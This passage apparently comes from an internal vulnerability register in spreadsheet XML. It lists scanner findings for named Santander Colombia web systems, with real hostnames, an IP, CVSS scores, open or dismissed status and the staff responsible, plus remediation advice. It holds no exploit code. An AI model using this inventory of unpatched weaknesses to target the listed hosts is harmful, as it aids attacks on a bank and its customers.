    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <m/>
    <s v="SC-25-CNMPO-010-CO-003"/>
    <x v="152"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="2.8"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-11-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de tipo &quot;gzip&quot; o &quot;DEFLATE&quot;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_x000a_contenido arbitraria."/>
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento._x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una_x000a_petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite una_x000a_mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de_x000a_rendimiento en las solicitudes afectadas._x000a_A continuación, se muestra cómo se deshabilita la compresión HTTP para Apache y NGINX:_x000a_Deshabilitar compresión en Apache:_x000a_• Deshabilite el módulo mod_deflate utilizando el siguiente comando:_x000a_ $ sudo a2dismod deflate_x000a_• Reinicie el servidor:_x000a_ $ sudo /etc/init.d/apache2 restart_x000a_Deshabilitar compresión en NGINX:_x000a_• Establezca la configuración del host con la opción gzip en off:_x000a_ server {_x000a_ server_name www.example.com;_x000a_ listen 443 ssl http2;_x000a_ gzip off;_x000a_ }"/>
    <s v="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
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="442"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-23814fc7-2d72-4cda-bbf1-252d47f5de72"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="443"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-28c255d7-9c6e-4e69-beab-a22a3238924c"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="444"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-8d99c9db-2742-4dce-93f8-4b9014828454"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="445"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-a10fc963-c69f-4640-82af-ad20d3cdd60e"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="446"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-f1b8b665-1c14-4b2e-af00-6327757c2f7d"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;HTTPOnly&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;HTTPOnly&amp;quot; attribute to cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="447"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-036815ab-5173-4e17-8ad8-70fb396cb52e"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="448"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-448ad1ff-ef9f-435f-a0bb-4ebf5fd1dd2b"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="449"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-63275107-59f7-408f-bd5b-532f65cabd84"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="450"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-eb395f98-990c-4cce-92f7-d5bd1e571b31"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="451"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO-Prospera"/>
    <s v="QA-WAS-f017d97c-5061-487b-b9ef-9ed3bfa394df"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co/santander"/>
    <m/>
    <m/>
    <d v="2025-05-02T00:00:00"/>
    <n v="417"/>
    <d v="2025-07-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="452"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Prospera"/>
    <m/>
    <s v="SC-25-CNMPO-006-CO-001"/>
    <x v="152"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="sso-management.servicios.santanderconsumer.Co"/>
    <m/>
    <m/>
    <d v="2025-07-10T00:00:00"/>
    <n v="348"/>
    <d v="2025-11-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de tipo &quot;gzip&quot; o &quot;DEFLATE&quot;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
    <s v="Se recomienda desactivar la compresión HTTP por completo, reduciendo el rendimiento, o adoptar_x000a_soluciones elaboradas para tratar de frustrar BREACH en escenarios de ataque individuales, como_x000a_el uso de protección de falsificación de petición en sitios cruzados (CSRF)._x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una_x000a_petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite una_x000a_mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de_x000a_rendimiento en las solicitudes afectadas._x000a_A continuación, se muestra cómo se desactivaría la compresión HTTP para Apache y NGINX:_x000a_Deshabilitar compresión en Apache:_x000a_• Deshabilite el módulo mod_deflate utilizando el siguiente comando:_x000a_ $ sudo a2dismod deflate_x000a_• Reinicie el servidor:_x000a_ $ sudo /etc/init.d/apache2 restart_x000a_Deshabilitar compresión en NGINX:_x000a_• Establezca la configuración del host con la opción gzip en off:_x000a_ server {_x000a_ server_name www.example.com;_x000a_ listen 443 ssl http2;_x000a_ gzip off;_x000a_ }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre el navegador_x000a_del cliente y el servidor, y tener acceso a la información transmitida entre ambos a través del canal_x000a_de comunicaciones (datos personales, credenciales de usuario, identificadores de sesión, etc.)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="453"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Prospera"/>
    <m/>
    <s v="SC-25-CNMPO-006-CO-002"/>
    <x v="152"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="prospera.santanderconsumer.com"/>
    <m/>
    <m/>
    <d v="2025-07-10T00:00:00"/>
    <n v="348"/>
    <d v="2025-11-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de tipo &quot;gzip&quot; o &quot;DEFLATE&quot;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
    <s v="Se recomienda desactivar la compresión HTTP por completo, reduciendo el rendimiento, o adoptar_x000a_soluciones elaboradas para tratar de frustrar BREACH en escenarios de ataque individuales, como_x000a_el uso de protección de falsificación de petición en sitios cruzados (CSRF)._x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una_x000a_petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite una_x000a_mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de_x000a_rendimiento en las solicitudes afectadas._x000a_A continuación, se muestra cómo se desactivaría la compresión HTTP para Apache y NGINX:_x000a_Deshabilitar compresión en Apache:_x000a_• Deshabilite el módulo mod_deflate utilizando el siguiente comando:_x000a_ $ sudo a2dismod deflate_x000a_• Reinicie el servidor:_x000a_ $ sudo /etc/init.d/apache2 restart_x000a_Deshabilitar compresión en NGINX:_x000a_• Establezca la configuración del host con la opción gzip en off:_x000a_ server {_x000a_ server_name www.example.com;_x000a_ listen 443 ssl http2;_x000a_ gzip off;_x000a_ }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre el navegador_x000a_del cliente y el servidor, y tener acceso a la información transmitida entre ambos a través del canal_x000a_de comunicaciones (datos personales, credenciales de usuario, identificadores de sesión, etc.)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="454"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Prospera"/>
    <m/>
    <s v="SC-25-CNMPO-006-CO-003"/>
    <x v="195"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="prospera.santanderconsumer.com"/>
    <m/>
    <m/>
    <d v="2025-07-10T00:00:00"/>
    <n v="348"/>
    <d v="2025-11-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante la sesión._x000a_La estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, empleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la información se envía a través de un canal seguro._x000a_El protocolo incorpora una cabecera HTTP &quot;HSTS&quot; (HTTP Strict Transport Security) enviada desde el servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán almacenadas en el navegador durante un tiempo determinado que se establece en la propia cabecera de respuesta"/>
    <s v="Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta &quot;HSTS&quot;_x000a_en todas las respuestas del servidor. La sintaxis para ello es:_x000a_•Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains]_x000a_El parámetro &quot;max-age&quot; especifica el tiempo requerido para usar HTTPS y debería ser un número_x000a_alto, del orden de varios meses. La flag &quot;includeSubDomains&quot; define que la política aplica también a_x000a_los subdominios."/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor_x000a_web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web_x000a_y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y_x000a_servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="455"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-db09f9cc-fe72-48df-a171-c8367d1e3f17"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/sources/"/>
    <m/>
    <m/>
    <d v="2025-07-12T00:00:00"/>
    <n v="346"/>
    <d v="2025-10-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A potentially sensitive file, directory, or directory listing was discovered on the Web server."/>
    <s v="Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="456"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="MAN-686fa9bb70644f058090aeb4"/>
    <m/>
    <x v="5"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.4000000000000004"/>
    <m/>
    <m/>
    <s v=" https://181.57.221.233/"/>
    <m/>
    <m/>
    <d v="2025-07-14T00:00:00"/>
    <n v="344"/>
    <d v="2025-10-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a_Normalmente este tipo de información se puede encontrar en las cabeceras HTTP de respuesta del servidor o en alguna página de error o por defecto del aplicativo."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al tipo de servidor_x000a_y versión utilizado para alojar la propia aplicación. Para ello es necesario eliminar las cabeceras de_x000a_respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información."/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a_x000a_un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como_x000a_generar ataques más elaborados contra la plataforma."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="457"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <m/>
    <m/>
    <x v="196"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v=" https://181.57.221.233/"/>
    <m/>
    <m/>
    <d v="2025-07-14T00:00:00"/>
    <n v="344"/>
    <d v="2025-11-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor acepta más métodos HTTP de los únicos necesarios para el correcto funcionamiento del aplicativo. Estos métodos podrían permitir a un atacante realizar ciertas acciones en el sistema, desde la obtención de información o incluso creación o borrado de elementos."/>
    <s v="Se recomienda denegar el uso de los métodos TRACE, OPTIONS y CONNECT siempre que sea_x000a_posible. Además, los métodos PUT y DELETE únicamente han de ser permitidos únicamente en aplicaciones_x000a_de tipo API RESTFUL en las que se necesite su uso . Por otro lado, los métodos GET, POST y HEAD son considerados como métodos seguros y han de estar habilitados en todas las aplicaciones (HEAD es opcional) que utilicen los protocolos_x000a_HTTP/HTTPS para comunicarse."/>
    <s v="Dependiendo la configuración en el servidor, el uso de ciertos métodos como (PUT, DELETE, TRACE_x000a_u OPTIONS) podrían permitir a un atacante realizar ciertas opciones como por ejemplo, crear o_x000a_borrar elementos."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="458"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <m/>
    <m/>
    <x v="197"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v=" https://181.57.221.233/"/>
    <m/>
    <m/>
    <d v="2025-07-14T00:00:00"/>
    <n v="344"/>
    <d v="2025-11-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación no establece medidas de seguridad que controlen el uso de sus páginas web dentro de otros “Frames” HTML ubicados en aplicaciones de otros dominios. De esta manera, se puede definir una página HTML con un frame transparente y, en otro frame, cargar una página legítima de la aplicación afectada. Así, el usuario interactúa sin saberlo con el frame transparente, que ejecutará cualquier código ideado por el atacante aunque la apariencia de la aplicación que contempla el usuario sea la de la aplicación legítima que se encuentra cargada debajo del frame transparente"/>
    <s v="Se recomienda utilizar la cabecera &quot;X-Frame-Options&quot; en las respuestas HTTP para notificar al_x000a_navegador los permisos sobre qué dominios pueden cargar las páginas de la aplicación._x000a_Actualmente esta funcionalidad se encuentra ampliamente soportada. Seleccionar una de las_x000a_siguiente opciones según corresponda._x000a_• Indica al navegador que la página no se debe cargar nunca dentro de otro frame_x000a_ X-Frame-Options: DENY _x000a_• Indica al navegador que la página se podrá cargar únicamente en frames pertenecientes al_x000a_mismo dominio_x000a_ X-Frame-Options: SAMEORIGIN_x000a_• Indica al navegador que la página se permite cargar en frames únicamente pertenecientes_x000a_al dominio indicado_x000a_ X-Frame-Options: ALLOW-FROM &lt;origen&gt;_x000a_Adicionalmente, se pueden incluir fragmentos de Javascript en la respuesta que detecten si se_x000a_encuentra dentro de un frame y cargar la página sin frames._x000a_El ejemplo más sencillo sería incluir al principio del código HTML de la respuesta lo siguiente:_x000a_ &lt;script&gt;if (top!=self) top.location.href=self.location.href&lt;/script&gt;"/>
    <s v="De no configurar correctamente el servidor y/o la aplicación web para no permitir ataques de Clickjacking, un atacante podría llevar a cabo un secuestro de sesión mediante un previo ataque de Phishing para provocar que el usuario legítimo acceda a la página maliciosa. El riesgo de este tipo de vulnerabilidad se establece como bajo por la dificultad de realizar un ataque con éxito. Para ello, sería necesario dirigir la navegación de un usuario a un sitio controlado por un atacante, posiblemente con una URL similar a la de la aplicación legítima. En ese sitio, una página HTML contendría un frame que carga la página legítima de la aplicación afectada. En dicho caso, por ejemplo, entrarían en juego aspectos tales como el certificado del servidor del atacante y la URL, que provocaría una alerta del navegador al usuario y tendría que aceptar o pasar por alto que no son propios de la aplicación."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="459"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <m/>
    <m/>
    <x v="155"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v=" https://181.57.221.233/"/>
    <m/>
    <m/>
    <d v="2025-07-14T00:00:00"/>
    <n v="344"/>
    <d v="2025-11-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de las cabeceras cache-control y pragma HTTP permite que el navegador y los proxies almacenen el contenido en la memoria caché. Independientemente de la política de caché definida por la aplicación web."/>
    <s v="Las aplicaciones deben devolver las directivas de almacenamiento en caché indicando a los_x000a_navegadores que no almacenen copias locales de ningún dato sensible. A menudo, esto se puede lograr mediante la configuración del servidor web para evitar el almacenamiento en caché de rutas relevantes o cualquier otra información sensible. Alternativamente, la mayoría de las plataformas de desarrollo web, permiten controlar las directivas de almacenamiento en caché del servidor desde scripts individuales. _x000a_Se recomienda que el servidor web devuelva las siguientes cabeceras HTTP en todas las respuestas_x000a_que contengan contenido sensible:_x000a_• Cache-control: no-store_x000a_• Pragma: no-cache"/>
    <s v="A menos que se indique lo contrario, los navegadores pueden almacenar una copia en caché local del contenido recibido de los servidores web. Algunos navegadores, guardan en caché el contenido obtenido a través de HTTPS. Si la información sensible en las respuestas de la aplicación se almacena en caché local, puede ser recuperada por otros usuarios que tienen acceso a la misma computadora en un momento futuro además de ser susceptible a ataques de tipo Caché Poisoning"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="460"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-2321d6bb-e0cd-4456-a49f-7aa7636b8964"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="461"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-4f0a7091-1b81-406f-9009-74aad6d1261c"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="462"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-8335bd4e-7c6f-470d-a2bb-d4d17cb671ea"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="463"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Botón de pago PSE"/>
    <s v="QA-WAS-963e0f67-5b90-4d7e-980f-ac6438fbf6b3"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://psepagos.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-19T00:00:00"/>
    <n v="339"/>
    <d v="2025-10-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
